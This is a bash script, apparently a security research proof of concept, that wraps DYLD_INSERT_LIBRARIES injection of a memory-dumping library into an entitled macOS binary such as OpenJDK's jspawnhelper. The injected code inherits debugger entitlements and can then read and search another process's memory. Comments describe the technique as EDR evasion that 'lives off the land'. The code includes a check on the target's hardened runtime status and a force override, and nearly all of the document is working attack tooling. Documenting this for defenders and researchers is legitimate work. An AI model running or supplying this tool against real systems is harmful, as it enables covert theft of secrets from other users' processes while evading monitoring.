#!/bin/bash
#
# attach.sh - wrapper for memdumper.dylib injection and memory dumping
#
# This script facilitates DYLD library injection to inherit debugging
# entitlements from entitled binaries on macOS. It demonstrates how EDRs
# can be bypassed by injecting code into processes with the
# com.apple.security.cs.debugger entitlement.
#
# MECHANISM:
#
# 1. Execute an entitled binary (e.g., OpenJDK's jspawnhelper) with
#    DYLD_INSERT_LIBRARIES pointing to memdumper.dylib
# 2. The dylib loads into the entitled process's address space
# 3. With inherited debugger entitlement, the dylib can access target process
#    memory via task_for_pid(), ptrace(), and proc_pidinfo()
#
# REQUIREMENTS:
#
# The entitled binary must have these entitlements:
# - com.apple.security.cs.debugger
# - com.apple.security.cs.allow-dyld-environment-variables
# - com.apple.security.cs.disable-library-validation
#
# The target process must not be protected by Hardened Runtime.
# attach.sh must run as root (uid 0). A non-root start is refused
# before exec so taskgated does not present Developer Tool Access.
#
# EVASION CHARACTERISTICS:
#
# This demonstrates "Living Off The Land" (LOL) principles using commonly-found
# applications on macOS developer systems. EDRs will see the entitled binary (e.g.,
# jspawnhelper) as the running process, whilst the injected dylib is not
# independently visible as a separate process. However, certain macOS EDRs
# (e.g., CrowdStrike Falcon) also log environment variables, which would reveal
# DYLD_INSERT_LIBRARIES and expose the technique.

export __progname="$(basename "$0")"

errx() {
	echo "${__progname}: ${1}" >&2

	exit 1
}

usage() {
	echo "Usage: ${__progname} [options] -p <pid> <command> [args...]" >&2
	echo "" >&2
	echo "Options:" >&2
	echo "  -p, --pid PID          target process ID (required)" >&2
	echo "  -s, --search STRING    search for STRING in process memory" >&2
	echo "  -n, --max-regions N    max number of regions to dump (default: 100)" >&2
	echo "  -f, --force            try to attach even if hardened runtime detected" >&2
	echo "  -h, --help             show this help message" >&2
	echo "" >&2
	echo "Example:" >&2
	echo "  sudo ${__progname} -p 4543 /opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper" >&2
	echo "  sudo ${__progname} -s TESTSTRING -p 4543 /opt/homebrew/Cellar/openjdk/25.0.2/libexec/openjdk.jdk/Contents/Home/lib/jspawnhelper" >&2
	echo "  sudo ${__progname} -n 50 -p 4543 /opt/homebrew/Cellar/openjdk/25.0.2/bin/java TestSpawn" >&2

	exit 1
}

check_hardened_runtime() {
	local -r target_pid="${1}"
	local -r force_flag="${2}"
	local target_path codesign_info target_name

	ps -p "${target_pid}" >/dev/null 2>&1 || \
		errx "process ${target_pid} not found"

	target_name=$(ps -p "${target_pid}" -o comm= 2>/dev/null | awk -F/ '{print $NF}')

	echo "Target: pid ${target_pid} (${target_name})"

	target_path=$(lsof -p "${target_pid}" 2>/dev/null | grep "txt.*REG" | head -1 | sed 's/.* \//\//')

	[ ! -n "${target_path}" ] && \
		return 0

	codesign_info=$(codesign -dv "${target_path}" 2>&1)

	if echo "${codesign_info}" | grep -q "runtime"; then
		echo "Target has hardened runtime enabled" >&2
		echo "Attack will fail (similar to 1Password and Chrome)" >&2
		echo "Hardened runtime blocks: task_for_pid(), ptrace(), memory access" >&2
		echo "" >&2

		if [ "${force_flag}" -eq 0 ]; then
			errx "Process is protected, use --force to try anyway"
		else
			echo "Continuing due to --force flag (will likely fail)..." >&2
			echo "" >&2
		fi
	elif echo "${codesign_info}" | grep -qE "flags=0x0\(none\)|flags=0x2\(adhoc\)"; then
		echo "Target has no hardened runtime" >&2
		echo "" >&2
	fi
}

main() {
	local max_regions=100
	local search_string=""
	local force=0
	local target_pid=""
	local -a command_args
	local dylib_path

	[ ${#} -eq 0 ] && \
		usage

	while [ ${#} -gt 0 ]; do
		case "${1}" in
			-h|--help)
				usage
				;;
			-p|--pid)
				[ ! ${#} -ge 2 ] && \
					errx "--pid requires an argument"
				target_pid="${2}"
				shift 2
				;;
			-n|--max-regions)
				[ ! ${#} -ge 2 ] && \
					errx "--max-regions requires an argument"
				max_regions="${2}"
				shift 2
				;;
			-s|--search)
				[ ! ${#} -ge 2 ] && \
					errx "--search requires an argument"
				search_string="${2}"
				shift 2
				;;
			-f|--force)
				force=1
				shift
				;;
			-*)
				errx "unknown option: ${1}"
				;;
			*)
				command_args=("${@}")
				break
				;;
		esac
	done

	[ ! -f memdumper.dylib ] && \
		errx "memdumper.dylib not found, run make first"

	[ ! -n "${target_pid}" ] && \
		errx "-p <pid> is required"

	[ ${#command_args[@]} -eq 0 ] && \
		errx "command required"

	check_hardened_runtime "${target_pid}" "${force}"

	[ "$(id -u)" -ne 0 ] && \
		errx "root required"

	export MEMDUMPER_TARGET_PID="${target_pid}"

	[ -n "${search_string}" ] && \
		export MEMDUMPER_SEARCH="${search_string}"

	export MEMDUMPER_MAX_REGIONS="${max_regions}"

	dylib_path="$(pwd)/memdumper.dylib"
	DYLD_INSERT_LIBRARIES="${dylib_path}" "${command_args[@]}" 2>&1
}

main "$@"
